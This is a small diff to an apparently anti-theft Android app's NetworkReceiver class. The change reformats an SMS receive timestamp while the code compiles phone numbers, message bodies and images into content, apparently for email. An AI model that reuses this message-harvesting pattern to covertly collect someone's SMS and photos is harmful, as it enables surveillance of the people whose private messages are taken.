@@ -14,6 +14,7 @@ import com.android.findmyandroid.model.SMS;
 import com.android.findmyandroid.utils.EmailHandler;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 /**
@@ -82,7 +83,7 @@ public class NetworkReceiver extends BroadcastReceiver {
         if (listSMS != null){
             content += "SMS:\n";
             for (SMS sms : listSMS) {
-                content += "Đọc lúc:" + sms.getTime() + "\n\t\tSDT:" + sms.getPhoneNumber() + " nhận lúc " + sms.getTimeReceive() + "\n\t\tNội dung: " + sms.getBody() + "\n";
+                content += "Đọc lúc:" + sms.getTime() + "\n\t\tSDT:" + sms.getPhoneNumber() + " nhận lúc " + (new Date(Long.parseLong(sms.getTimeReceive()))).toString() + "\n\t\tNội dung: " + sms.getBody() + "\n";
             }
         }
         if (listImage != null){
